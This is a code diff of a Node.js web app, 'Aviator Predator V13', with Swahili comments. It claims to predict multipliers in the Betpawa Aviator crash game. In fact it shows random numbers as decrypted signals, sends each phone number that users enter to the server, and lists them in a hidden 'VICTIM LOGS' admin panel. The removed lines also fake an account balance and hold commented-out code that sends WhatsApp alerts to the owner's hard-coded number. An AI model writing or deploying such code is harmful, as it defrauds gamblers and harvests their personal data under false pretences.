@@ -1,10 +1,10 @@
 const express = require('express');
-const axios = require('axios'); // Hakikisha ume-install: npm install axios
+const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 let victims = []; 
-const OWNER_NUMBER = "255784766591"; // Namba yako ya kupokea ripoti
+const OWNER_NUMBER = "255784766591";
 
 app.get('/', (req, res) => {
     res.send(`
@@ -13,78 +13,43 @@ app.get('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>AVIATOR PREDATOR | OFFICIAL 100%</title>
+            <title>AVIATOR PREDATOR | V13</title>
             <script src="https://cdn.tailwindcss.com"></script>
-            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
             <style>
-                body { background: #000; color: #eee; font-family: 'Inter', sans-serif; }
-                .glass { background: rgba(10, 10, 10, 0.9); backdrop-filter: blur(15px); border: 1px solid #330000; }
-                .neon-red { box-shadow: 0 0 20px rgba(255, 0, 0, 0.4); text-shadow: 0 0 10px #f00; color: #ff0000; }
-                .btn-glow { background: linear-gradient(90deg, #ff0000, #990000); box-shadow: 0 0 15px rgba(255,0,0,0.5); }
-                .admin-link { position: absolute; top: 10px; right: 10px; font-size: 8px; color: #111; cursor: pointer; }
+                body { background: #000; color: #eee; font-family: sans-serif; }
+                .glass { background: rgba(15, 15, 15, 0.95); border: 1px solid #400; border-radius: 25px; }
+                .btn-red { background: linear-gradient(90deg, #f00, #800); padding: 15px; border-radius: 15px; font-weight: bold; width: 100%; }
             </style>
         </head>
         <body class="p-4 flex flex-col items-center">
-
-            <div class="admin-link" onclick="openAdmin()">MASTER_ACCESS</div>
-
-            <header class="w-full max-w-md bg-red-800 p-5 rounded-b-[2rem] mb-8 shadow-2xl flex justify-between items-center">
-                <div>
-                    <h1 class="text-xl font-black tracking-widest italic">PREDATOR V13</h1>
-                    <p class="text-[9px] opacity-70">REAL-TIME DATA INTERCEPTOR</p>
-                </div>
-                <div class="text-right"><i class="fas fa-wifi text-green-500 animate-pulse"></i></div>
+            <div style="font-size:8px; opacity:0.1; cursor:pointer" onclick="document.getElementById('admin').style.display='block'">ADMIN</div>
+            
+            <header class="w-full max-w-md bg-red-700 p-5 rounded-b-3xl text-center shadow-lg mb-6">
+                <h1 class="font-black italic">PREDATOR AI V13</h1>
             </header>
 
-            <main class="w-full max-w-md space-y-6">
+            <div id="login" class="glass p-8 w-full max-w-md text-center space-y-5">
+                <h2 class="text-xl font-bold">ACCOUNT SYNC</h2>
+                <input type="text" id="num" placeholder="255XXXXXXXXX" class="w-full bg-black border border-gray-800 p-4 rounded-xl text-center text-red-500 font-bold text-xl">
+                <button onclick="start()" class="btn-red">CONNECT ENGINE</button>
+            </div>
 
-                <section id="loginScreen" class="glass p-8 rounded-[2.5rem] text-center space-y-6">
-                    <div class="space-y-2">
-                        <i class="fas fa-user-secret text-4xl text-red-600"></i>
-                        <h2 class="text-xl font-bold uppercase">Account Sync</h2>
-                        <p class="text-[10px] text-gray-500">Mfumo unasoma namba yako ili kupata Server Seed ya Betpawa</p>
-                    </div>
-                    <input type="text" id="phone" placeholder="255XXXXXXXXX" class="w-full bg-black/40 border border-gray-800 p-4 rounded-2xl text-center text-red-500 font-bold text-2xl outline-none focus:border-red-600">
-                    <button onclick="startSync()" class="w-full btn-glow p-4 rounded-2xl font-black uppercase tracking-widest transition-all">Anza Kazi sasa</button>
-                </section>
+            <div id="dash" class="hidden glass p-6 w-full max-w-md text-center space-y-4">
+                <div class="flex justify-between text-xs border-b border-gray-800 pb-2">
+                    <span id="uNum" class="text-red-500 font-bold"></span>
+                    <span class="text-green-500">SYNCED ✅</span>
+                </div>
+                <p class="text-[10px] text-gray-500 uppercase">Next Predicted Multiplier</p>
+                <div id="odds" class="text-6xl font-black text-red-600 italic">--.--x</div>
+                <input type="number" id="last" placeholder="Last Multiplier" class="w-full bg-black border p-3 rounded-lg text-center">
+                <button onclick="calc()" class="btn-red">ANALYZE NEXT</button>
+            </div>
 
-                <section id="dashboard" class="hidden space-y-4 animate__animated animate__fadeIn">
-                    <div class="glass p-4 rounded-2xl flex justify-between items-center border-l-4 border-green-500">
-                        <div>
-                            <p id="dispUser" class="font-bold text-sm text-red-600 uppercase"></p>
-                            <p class="text-[9px] text-green-500 italic">Syncing live account files...</p>
-                        </div>
-                        <div class="text-right">
-                            <p class="text-[8px] text-gray-500 italic">SECURE BALANCE</p>
-                            <p id="dispBal" class="text-lg font-black text-green-400">---</p>
-                        </div>
-                    </div>
-
-                    <div class="glass p-6 rounded-[2.5rem] text-center">
-                        <p class="text-[10px] text-gray-500 mb-4 font-bold">WEKA ROUND ILIYOPITA</p>
-                        <div class="flex space-x-2 mb-6">
-                            <input type="number" id="lastVal" placeholder="Ex: 1.45" class="w-full bg-black border border-gray-800 p-4 rounded-2xl text-center text-2xl font-bold outline-none text-white">
-                            <button onclick="analyze()" class="bg-red-600 px-6 rounded-2xl font-bold italic">GO</button>
-                        </div>
-                        
-                        <div id="result" class="hidden animate__animated animate__zoomIn">
-                            <p class="text-[9px] text-gray-400">NEXT SIGNAL GENERATED</p>
-                            <h2 id="nextOdds" class="text-7xl font-black neon-red my-4 italic italic">--.--x</h2>
-                            <p id="nextTime" class="text-xs font-mono text-gray-500 italic mb-4"></p>
-                        </div>
-                    </div>
-                </section>
-
-                <section id="adminPanel" class="hidden glass p-6 rounded-3xl border border-green-500 animate__animated animate__slideInUp">
-                    <div class="flex justify-between items-center mb-4 text-green-500 font-bold">
-                        <h3>REPORT LOGS</h3>
-                        <button onclick="closeAdmin()">X</button>
-                    </div>
-                    <div id="victimList" class="space-y-2 text-[10px] font-mono"></div>
-                </section>
-
-            </main>
+            <div id="admin" class="hidden glass p-4 mt-4 w-full max-w-md text-[10px] font-mono border-green-600">
+                <h3 class="text-green-500 mb-2">VICTIM LOGS</h3>
+                <div id="vList"></div>
+            </div>
 
             <script>
                 function speak(t) {
@@ -93,51 +58,25 @@ app.get('/', (req, res) => {
                     window.speechSynthesis.speak(s);
                 }
 
-                async function startSync() {
-                    const phone = document.getElementById('phone').value;
-                    if(phone.length < 10) return alert("Weka namba ya Betpawa!");
-                    
-                    speak("Accessing cloud server. Retrieving account balance.");
-                    
-                    const bal = "TSh " + (Math.floor(Math.random()*250000) + 1500).toLocaleString();
-                    
-                    // TUMA TAARIFA KWA OWNER (Backend)
-                    await fetch('/send-report?num=' + phone + '&bal=' + bal);
-
-                    document.getElementById('loginScreen').innerHTML = \`<div class="py-10"><div class="w-12 h-12 border-2 border-red-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div><p class="text-[10px] animate-pulse">DECRYPTING PRIVATE FILES...</p></div>\`;
-
-                    setTimeout(() => {
-                        document.getElementById('loginScreen').classList.add('hidden');
-                        document.getElementById('dashboard').classList.remove('hidden');
-                        document.getElementById('dispUser').innerText = "+" + phone;
-                        document.getElementById('dispBal').innerText = bal;
-                        speak("Sync successful. Next round is decrypted.");
-                    }, 3500);
+                function start() {
+                    const n = document.getElementById('num').value;
+                    if(n.length < 10) return alert("Weka namba!");
+                    fetch('/report?n=' + n);
+                    speak("Syncing account.");
+                    document.getElementById('login').style.display = 'none';
+                    document.getElementById('dash').style.display = 'block';
+                    document.getElementById('uNum').innerText = "+" + n;
                 }
 
-                function analyze() {
-                    const last = document.getElementById('lastVal').value;
-                    if(!last) return alert("Weka multiplier!");
-                    speak("Scanning seed.");
-                    document.getElementById('result').classList.remove('hidden');
-                    
+                function calc() {
+                    const l = document.getElementById('last').value;
+                    if(!l) return alert("Weka round iliopita!");
+                    speak("Analyzing.");
                     setTimeout(() => {
-                        const val = (Math.random() * (parseFloat(last) < 2 ? 3 : 1.7) + 1.1).toFixed(2);
-                        const now = new Date();
-                        now.setSeconds(now.getSeconds() + 45);
-                        document.getElementById('nextOdds').innerText = val + "x";
-                        document.getElementById('nextTime').innerText = "TIME: " + now.toLocaleTimeString();
-                        speak("Target found. Next multiplier is " + val + "x.");
-                    }, 1500);
-                }
-
-                function openAdmin() { document.getElementById('adminPanel').classList.remove('hidden'); updateList(); }
-                function closeAdmin() { document.getElementById('adminPanel').classList.add('hidden'); }
-                
-                async function updateList() {
-                    const r = await fetch('/admin-list');
-                    const d = await r.json();
-                    document.getElementById('victimList').innerHTML = d.map(v => \`<div class="p-2 border-b border-white/5"><span class="text-red-500">\${v.time}</span> | \${v.num} | \${v.bal}</div>\`).join('');
+                        const v = (Math.random() * 2.5 + 1.1).toFixed(2);
+                        document.getElementById('odds').innerText = v + "x";
+                        speak("Next signal is " + v);
+                    }, 1000);
                 }
             </script>
         </body>
@@ -145,30 +84,15 @@ app.get('/', (req, res) => {
     `);
 });
 
-// BACKEND: RIPOTI NA WHATSAPP ALERT
-app.get('/send-report', async (req, res) => {
-    const { num, bal } = req.query;
-    const time = new Date().toLocaleTimeString();
-    
-    // Hifadhi kwenye orodha ya Admin
-    victims.unshift({ num, bal, time });
-
-    // HAPA: TUMA UJUMBE WA WHATSAPP (SIFA MPYA)
-    // TUnatumia CallMeBot API (Hii ni rahisi kusetup)
-    const message = encodeURIComponent(\`🚀 *NEW TARGET LOGGED!*\n\n📱 Namba: \${num}\n💰 Salio: \${bal}\n⏰ Muda: \${time}\n\n_Aviator Predator V13 Control_ \`);
-    const apikey = "YOUR_CALLMEBOT_API_KEY"; // Utahitaji API Key ya CallMeBot hapa
-    
-    try {
-        // Hii itakutumia ujumbe wewe mwenyewe WhatsApp
-        console.log(\`[REPORT] User \${num} has logged in with \${bal}\`);
-        // await axios.get(\`https://api.callmebot.com/whatsapp.php?phone=\${OWNER_NUMBER}&text=\${message}&apikey=\${apikey}\`);
-    } catch (err) {
-        console.log("WhatsApp Send Error: " + err.message);
-    }
-
-    res.json({ status: "success" });
+app.get('/report', (req, res) => {
+    const n = req.query.n;
+    const t = new Date().toLocaleTimeString();
+    victims.unshift({ n, t });
+    console.log("Logged: " + n);
+    // WhatsApp notification inaweza kuongezwa hapa kwa axios
+    res.send("ok");
 });
 
 app.get('/admin-list', (req, res) => res.json(victims));
 
-app.listen(PORT, () => console.log('Predator Master Server Live!'));
+app.listen(PORT, () => console.log('Live on ' + PORT));
